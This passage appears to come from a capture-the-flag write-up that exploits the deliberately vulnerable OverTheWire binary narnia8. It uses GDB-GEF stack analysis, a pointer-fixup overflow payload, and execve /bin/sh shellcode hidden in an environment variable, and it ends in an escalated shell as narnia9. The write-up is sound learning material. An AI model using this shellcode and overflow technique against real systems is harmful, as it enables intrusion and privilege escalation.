gef>  x/24xw $esp
0xffffd34c:     0x0804a008      0xffffd354      0x41414141      0x41414141
0xffffd35c:     0x00000000      0x00000000      0x00000000      0xffffd5b4  <-
0xffffd36c:     0xffffd378      0x08049201      0xffffd5b4      0x00000000 

# Run the binary with 9 A's
gef➤  x/24xw $esp
0xffffd34c:     0x0804a008      0xffffd354      0x41414141      0x41414141
0xffffd35c:     0x00000041      0x00000000      0x00000000      0xffffd5b3  <-
0xffffd36c:     0xffffd378      0x08049201      0xffffd5b3      0x00000000
```

Looking at what values the decrementing address points to shows us that it points to the input we give, this means that the address is the pointer to `blah`. The address directly after the address of `blah` is the **ebp** and the following address is the return address, where the function `func()` returns to the `main()` function.

When passing an argument that is over 20-bytes it overwrites the address of `blah` on the stack which causes it to break out of the loop and does not continue to copy input into the buffer `bok`.\
To prevent this, we can overwrite the address of `blah` with itself but minus 12. We minus 12 because we need to write 4-bytes for the address of `blah`, 4-bytes for the **ebp** and a final 4-bytes to overwrite the return address.

We first need to pass the binary an argument that is 20-bytes long before getting the address of `blah`.
```bash
gef>  x/24xw $esp
0xffffd33c:     0x0804a008      0xffffd344      0x41414141      0x41414141
0xffffd34c:     0x41414141      0x41414141      0x41414141      0xffffd5a8  <-
```

Now we can subtract 12 from the address **0xffffd5a8** to get **0xffffd59c**.\
The final payload will look like so, where the characters "CCCC" will overwrite the return address.
```bash
perl -e 'print "A"x20 . "\x9c\xd5\xff\xff" . "B"x4 . "CCCC"'
```

```bash
gef> run $(perl -e 'print "A"x20 . "\x9c\xd5\xff\xff" . "B"x4 . "CCCC"')
──── stack ────
0xffffd354│+0x0000: 0xffffd59c  →  0x41414141    ← $esp
0xffffd358│+0x0004: 0x00000000
0xffffd35c│+0x0008: 0xf7da1cb9  →  <__libc_start_call_main+0079> add esp, 0x10
0xffffd360│+0x000c: 0x00000002
0xffffd364│+0x0010: 0xffffd414  →  0xffffd58c  →  "/narnia/narnia8"
0xffffd368│+0x0014: 0xffffd420  →  0xffffd5bd  →  "SHELL=/bin/bash"
0xffffd36c│+0x0018: 0xffffd380  →  0xf7fade34  →  ",\r#"
0xffffd370│+0x001c: 0xf7fade34  →  ",\r#"
──── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x43434343
──── threads ────
[!] Id 1, Name: "narnia8", stopped 0x43434343 in ?? (), reason: SIGSEGV

# The return address is overwritten with 0x43434343 ("CCCC")
```

Memory addresses differ outside of **GDB-GEF**, running the binary with 20-bytes of input outside of GDB causes it to print the input we gave it as well as some unprintable characters. We can view the hex of these characters by piping the output from the binary into `xxd`.
```bash
narnia8@narnia:/narnia$ ./narnia8 $(perl -e 'print "A"x20') | xxd
00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
00000010: 4141 4141 86d5 ffff 98d3 ffff 0192 0408  AAAA............
00000020: c6d5 ffff 0a                             .....
```

Here we can see that the address of `blah` outside of **GDB-GEF** is **0xffffd586** and minus 12 is **0xffffd57a**.

Now we can overwrite the return address with a value we want to, we should point it to some shellcode to spawn a shell. To do this, I put the shellcode in an environment variable and used a script to get the address of the environment variable on the stack.

```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char* argv[])
{
  printf("%s is at %p\n", argv[1], getenv(argv[1]));
}
```

```bash
# Write the C code into a file in /tmp
# Compile the binary
gcc -m32 -o /tmp/find_env /tmp/find_env.c
```

### Exploit:
```bash
# Put the shellcode in an environment variable
export SHELLCODE=$(perl -e 'print "\x90"x20 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x66\x68\x2d\x70\x89\xe1\x50\x51\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')

# Locate the address of the environment variable on the stack
narnia8@narnia:/narnia$ /tmp/find_env SHELLCODE
SHELLCODE is at 0xffffd5ad

# Exploit the binary
narnia8@narnia:/narnia$ ./narnia8 $(perl -e 'print "A"x20 . "\x7a\xd5\xff\xff" . "B"x4 . "\xad\xd5\xff\xff"')
AAAAAAAAAAAAAAAAAAAAz{NON-PRINTABLE}
$ whoami
narnia9
```